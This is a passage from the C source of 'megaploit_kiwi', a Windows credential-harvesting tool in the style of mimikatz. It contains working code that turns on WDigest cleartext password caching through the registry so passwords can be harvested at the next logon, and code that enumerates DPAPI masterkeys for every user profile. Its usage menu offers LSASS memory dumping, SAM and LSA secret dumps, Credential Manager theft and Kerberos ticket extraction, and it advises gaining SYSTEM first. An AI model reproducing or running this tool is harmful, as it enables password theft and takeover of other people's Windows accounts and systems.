        /* Ticket validity window */
        SYSTEMTIME st_start, st_end;
        FileTimeToSystemTime((FILETIME*)&ti->StartTime,  &st_start);
        FileTimeToSystemTime((FILETIME*)&ti->EndTime,    &st_end);
        out_ok("Valid      : %02d/%02d/%04d %02d:%02d — %02d/%02d/%04d %02d:%02d",
               st_start.wMonth, st_start.wDay, st_start.wYear,
               st_start.wHour, st_start.wMinute,
               st_end.wMonth,   st_end.wDay,   st_end.wYear,
               st_end.wHour,    st_end.wMinute);

        fputs("[*] ---\n", stdout); fflush(stdout);
        free(spn); free(realm);
    }
    LsaFreeReturnBuffer(resp);
    LsaDeregisterLogonProcess(hLsa);
}


/* ═══════════════════════════════════════════════════════════════════════════
 * MODULE 6 — WDigest re-enable + harvest
 *   Sets HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest
 *   UseLogonCredential = 1, then dumps any already-cached cleartext.
 * ═══════════════════════════════════════════════════════════════════════════ */
static void cmd_wdigest(void) {
    out_inf("kiwi::wdigest — WDigest cleartext credential re-enable");

    /* Write the registry key to enable WDigest cleartext storage */
    HKEY hKey = NULL;
    LSTATUS rc = RegOpenKeyExW(HKEY_LOCAL_MACHINE,
        L"SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest",
        0, KEY_SET_VALUE, &hKey);
    if (rc != ERROR_SUCCESS) {
        out_err("RegOpenKey(WDigest) rc=%ld — need admin", rc);
        return;
    }
    DWORD val = 1;
    rc = RegSetValueExW(hKey, L"UseLogonCredential", 0, REG_DWORD,
                         (BYTE*)&val, sizeof(val));
    RegCloseKey(hKey);
    if (rc != ERROR_SUCCESS) {
        out_err("RegSetValueEx(UseLogonCredential) rc=%ld", rc);
        return;
    }
    out_ok("UseLogonCredential = 1 set — WDigest will cache cleartext on next user logon");
    out_inf("Re-run logonpasswords after user re-authenticates to harvest cleartext");
}


/* ═══════════════════════════════════════════════════════════════════════════
 * MODULE 7 — DPAPI masterkey enumeration
 *   Finds all Protect\* DPAPI masterkey GUIDs for the current and all users.
 * ═══════════════════════════════════════════════════════════════════════════ */
static void cmd_dpapi(void) {
    out_inf("kiwi::dpapi — DPAPI masterkey GUID enumeration");

    /* Current user's masterkeys */
    wchar_t protect_path[MAX_PATH];
    const wchar_t *appdata = _wgetenv(L"APPDATA");
    if (appdata) {
        swprintf_s(protect_path, MAX_PATH,
                    L"%ls\\Microsoft\\Protect", appdata);
        out_inf("Current user DPAPI path: %ls", protect_path);
    }

    /* Walk all user profiles — locate profiles root via registry */
    wchar_t profiles_root[MAX_PATH];
    {
        BOOL got_root = FALSE;
        HKEY hPL = NULL;
        if (RegOpenKeyExW(HKEY_LOCAL_MACHINE,
              L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\ProfileList",
              0, KEY_READ, &hPL) == ERROR_SUCCESS) {
            DWORD ptype = REG_SZ;
            DWORD plen  = (DWORD)(MAX_PATH * sizeof(wchar_t));
            if (RegQueryValueExW(hPL, L"ProfilesDirectory", NULL, &ptype,
                                  (BYTE*)profiles_root, &plen) == ERROR_SUCCESS) {
                wchar_t expanded[MAX_PATH];
                ExpandEnvironmentStringsW(profiles_root, expanded, MAX_PATH);
                wcsncpy_s(profiles_root, MAX_PATH, expanded, _TRUNCATE);
                got_root = TRUE;
            }
            RegCloseKey(hPL);
        }
        if (!got_root) {
            const wchar_t *sd = _wgetenv(L"SystemDrive");
            swprintf_s(profiles_root, MAX_PATH, L"%ls\\Users",
                        sd ? sd : L"C:");
        }
    }

    WIN32_FIND_DATAW fd;
    wchar_t pattern[MAX_PATH];
    swprintf_s(pattern, MAX_PATH, L"%ls\\*", profiles_root);
    HANDLE hFind = FindFirstFileW(pattern, &fd);
    if (hFind == INVALID_HANDLE_VALUE) {
        out_err("Cannot enumerate profiles at %ls", profiles_root);
        return;
    }
    do {
        if (!(fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) continue;
        if (wcscmp(fd.cFileName, L".") == 0 || wcscmp(fd.cFileName, L"..") == 0)
            continue;

        wchar_t mk_path[MAX_PATH];
        swprintf_s(mk_path, MAX_PATH,
                    L"%ls\\%ls\\AppData\\Roaming\\Microsoft\\Protect",
                    profiles_root, fd.cFileName);

        WIN32_FIND_DATAW mkfd;
        wchar_t mk_pat[MAX_PATH];
        swprintf_s(mk_pat, MAX_PATH, L"%ls\\*", mk_path);
        HANDLE hMK = FindFirstFileW(mk_pat, &mkfd);
        if (hMK == INVALID_HANDLE_VALUE) continue;

        char *user_u8 = wide_to_utf8(fd.cFileName);
        do {
            if (mkfd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) continue;
            char *guid = wide_to_utf8(mkfd.cFileName);
            out_ok("User: %-20s  MasterKey GUID: %s", user_u8, guid);
            free(guid);
        } while (FindNextFileW(hMK, &mkfd));
        FindClose(hMK);
        free(user_u8);
    } while (FindNextFileW(hFind, &fd));
    FindClose(hFind);
}

/* ─────────────────────────────────────────────────────────────────────────
 * USAGE / DISPATCH
 * ───────────────────────────────────────────────────────────────────────── */
static void print_usage(void) {
    puts("megaploit_kiwi — Advanced Windows credential harvester");
    puts("");
    puts("Usage:  megaploit_kiwi <module> [args]");
    puts("");
    puts("Modules:");
    puts("  logonpasswords   LSASS process memory — NTLM hashes + cleartext");
    puts("  sam              SAM hive offline dump — local account hashes");
    puts("  lsa              LSA secrets dump (encrypted; use bootkey to decrypt)");
    puts("  credman          Windows Credential Manager — stored passwords");
    puts("  tickets          Kerberos TGT/TGS ticket cache enumeration");
    puts("  wdigest          Re-enable WDigest cleartext storage");
    puts("  dpapi            DPAPI masterkey GUID enumeration");
    puts("  all              Run all modules");
    puts("");
    puts("Notes:");
    puts("  logonpasswords / sam / lsa require SYSTEM or SeDebugPrivilege.");
    puts("  credman / tickets / dpapi work as any interactive user.");
    puts("  Use  getsystem  first if not running as SYSTEM.");
}

int main(int argc, char *argv[]) {
    if (argc < 2) { print_usage(); return 1; }

    const char *module = argv[1];

    if (strcmp(module, "logonpasswords") == 0) {
        cmd_logonpasswords();
    } else if (strcmp(module, "sam") == 0) {
        cmd_sam();
    } else if (strcmp(module, "lsa") == 0) {
        cmd_lsa();
    } else if (strcmp(module, "credman") == 0) {
        cmd_credman();
    } else if (strcmp(module, "tickets") == 0) {
        cmd_tickets();
    } else if (strcmp(module, "wdigest") == 0) {
        cmd_wdigest();
    } else if (strcmp(module, "dpapi") == 0) {
        cmd_dpapi();
    } else if (strcmp(module, "all") == 0) {
        cmd_logonpasswords();
        cmd_sam();
        cmd_lsa();
        cmd_credman();
        cmd_tickets();
        cmd_wdigest();
        cmd_dpapi();
    } else {
        out_err("Unknown module: %s", module);
        print_usage();
        return 1;
    }
    return 0;
}

/* ─────────────────────────────────────────────────────────────────────────
 * NON-WINDOWS BUILD — compile-clean stub
 * ───────────────────────────────────────────────────────────────────────── */
#else  /* not _WIN32 */

int main(int argc, char *argv[]) {
    (void)argc; (void)argv;
    puts("[-] megaploit_kiwi: Windows-only binary");
    puts("[*] On Linux/macOS use: hashdump, sudo_sniff, ssh_harvest, cred_vault");
    return 1;
}

#endif /* _WIN32 */
